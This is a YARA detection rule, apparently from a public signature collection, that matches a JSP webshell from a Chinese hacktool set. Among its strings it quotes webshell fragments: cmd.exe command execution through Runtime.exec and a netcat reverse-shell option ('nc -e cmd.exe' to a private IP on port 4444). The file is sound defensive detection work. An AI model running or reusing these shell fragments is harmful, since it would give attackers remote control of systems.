rule Txt_jsp_alt_1
{
	meta:
		description = "Chinese Hacktool Set - Webshells - file jsp.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-14"
		hash = "74518faf08637c53095697071db09d34dbe8d676"
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
		$s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
		$s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
		$s4 = "cmd = \"cmd.exe /c set\";" fullword ascii

	condition:
		filesize <715KB and 2 of them
}
